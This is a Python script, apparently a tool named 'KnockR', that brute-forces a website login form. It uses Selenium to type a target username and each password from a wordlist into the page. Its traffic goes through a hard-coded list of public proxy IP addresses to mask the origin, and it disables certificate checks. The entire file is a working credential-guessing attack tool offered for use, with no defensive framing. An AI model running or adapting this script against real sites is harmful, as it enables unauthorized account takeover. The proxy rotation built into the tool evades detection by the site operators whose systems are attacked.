#!/usr/bin/env python3

import sys
import requests
import time
import os
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.proxy import Proxy, ProxyType
import argparse
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Initiation
username = None
usr_sel = None
pass_sel = None
button_sel = None
word_list = None 
url = None
delay = None
gotit = False

#Colors
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   END  = '\33[37m'


# Arguments
parser = argparse.ArgumentParser()
parser.add_argument("-p", dest="password_selector",help="Specify the password selector")
parser.add_argument("-l", dest="username_selector",help="Specify the username selector")
parser.add_argument("-b", dest="login_selector",help= "Specify the login button selector")
parser.add_argument("-d", dest="delay",help="Specify a delay")
parser.add_argument("-c", dest="chromedriver",help="Specify the path to chrome driver", default="/tmp/chromedriver")
requiredNamed = parser.add_argument_group('required named arguments')
requiredNamed.add_argument("-s", dest="url",help="Specify a url",required=True)
requiredNamed.add_argument("-u", dest="username",help="Specify the username",required=True)
requiredNamed.add_argument("-w", dest="wordlist",help="Specify the password list directory",required=True)

args = parser.parse_args()

def get_request():
    global gotit
    try:
        request_1 = requests.get(url, verify = False)
        gotit = True
        return request_1
    except:
        pass

def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
    final_pass = None
    man = "mandatorylastcheckthatcannotbeaviablepasswordcuzthatwouldbeawkwardafuknowwhatimsayinlolxdlol"
    sys.stdout.write(color.BLUE+'\n[~] '+ 'Checking if URL is reachable... '+color.END)
    sys.stdout.flush()
    try:
        get_request()
        time.sleep(5)
        if not gotit:
            print (color.RED+'[X]'+color.END)
            print (color.RED+'[!]'+ ' Website unreachable'+color.END)
            exit()
        else:
            if get_request().status_code == 200:
                print (color.GREEN+'[OK]'+color.END)
                sys.stdout.flush()
    except KeyboardInterrupt:
        sys.exit(color.RED+'\n[!] '+ 'Keyboard interrupt'+color.END)
    else:
        pass
    
    proxy_list = [
        {'http':'http://45.238.220.1:8181'},
        {'http':'http://124.105.180.29:8082'},
        {'http':'http://152.230.8.186:999'},
        {'http':'http://195.224.107.165:8080'},
        {'http':'http://192.236.160.186:80'},
        {'http':'http://62.204.197.206:80'}, 
        {'http':'http://202.180.54.97:8080'},
        {'https': 'https://122.129.84.12:8080'},
        {'http': 'http://103.88.237.24:8080'}
    ]
    
    for p in proxy_list:
        try:
            r = requests.get(list(p.keys())[0]+'://icanhazip.com', proxies=p, timeout=9)
            if r.ok:
                print(color.GREEN+f"Switching to proxy {r.content.decode('utf-8')}"+color.END)
                optionss = webdriver.ChromeOptions()
                optionss.add_argument(f"--proxy-server={list(p.values())[0]}")
                optionss.add_argument("--disable-popup-blocking")
                optionss.add_argument("--disable-extensions")
                optionss.add_argument("--incognito")
                driver = webdriver.Chrome(service = Service(chromedriver), options=optionss)
                print (color.GREEN+'\n[*] Starting dictionary attack against '+color.YELLOW+username+color.GREEN+' with a '+color.YELLOW+delay+color.GREEN+' seconds delay'+color.END)
                with open(word_list, 'r') as f:
                    for passwd in f:
                        print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
                        try:
                            driver.get(url)
                            Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
                            Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
                            driver.find_element(By.CSS_SELECTOR, button_sel)
                            Sel_user.send_keys(username)
                            Sel_pas.send_keys(passwd+"\n")
                            time.sleep(int(delay))
                            final_pass = passwd
                            if not driver.find_element(By.CSS_SELECTOR, usr_sel).is_displayed():
                                sys.exit(color.GREEN+'\nPossible Password found: '+color.RED+final_pass+color.RED+'\n[!] It\'s possible that there was a timeout and the password found is not the correct one.'+color.END)
                        except NoSuchElementException as E:
                            if final_pass == None:
                                sys.exit(color.RED+f'\n[+] An error occured: [ {E} ]'+color.END)
                            else:
                                sys.exit(color.GREEN+'\nPossible Password found: '+color.RED+final_pass+color.RED+'\n[!] It\'s possible that there was a timeout and the password found is not the correct one.'+color.END)
                        except KeyboardInterrupt:
                            sys.exit(color.RED+'\n[!] User interrupt'+color.END)
                sys.exit(color.RED+'\n[-] Password not found'+color.END)
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ProxyError, requests.exceptions.ReadTimeout):
            print(color.RED+f"Proxy {p['http']} not available"+color.END)
            pass
    
    

def banner():
    banner = color.BOLD+'''
{0} _  __                     _     ____  
{0}| |/ / _ __    ___    ___ | | __|  _ \ 
{2}| ' / | '_ \  / _ \  / __|| |/ /| |_) |
{2}| . \ | | | || (_) || (__ |   < |  _ < 
{2}|_|\_\|_| |_| \___/  \___||_|\_\|_| \_\\
              {5}by kod34
                        
'''.format(color.PURPLE, color.END, color.GREEN, color.RED, color.BLUE, color.DARKCYAN, color.CYAN)
    print(banner+color.END)


banner()
username = args.username
usr_sel = args.username_selector
pass_sel = args.password_selector
button_sel = args.login_selector
url = args.url
word_list = args.wordlist
if not os.path.exists(word_list):
    sys.exit(color.RED+'\n[-] Invalid wordlist path'+color.END)
if not os.access(word_list, os.R_OK):
    sys.exit(color.RED+'\n[-] Please give your wordlist reading permissions'+color.END)
        
chromedriver = args.chromedriver


if not os.path.exists(chromedriver):
    sys.exit(color.RED+'\n[-] Invalid chromedriver path'+color.END)
delay = args.delay

try:
    while usr_sel == None or usr_sel == '':
        usr_sel = input(color.YELLOW+'Username selector: '+color.END)
    while pass_sel == None or pass_sel == '':    
        pass_sel = input(color.YELLOW+'Password selector: '+color.END)
    while button_sel == None or button_sel == '':
        button_sel = input(color.YELLOW+'Login button selector: '+color.END)
    while delay == None or not delay.isdigit():
        delay = input(color.YELLOW+'Delay: '+color.END)
except KeyboardInterrupt:
    sys.exit(color.RED+'\n[!] User interrupt'+color.END)
brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay)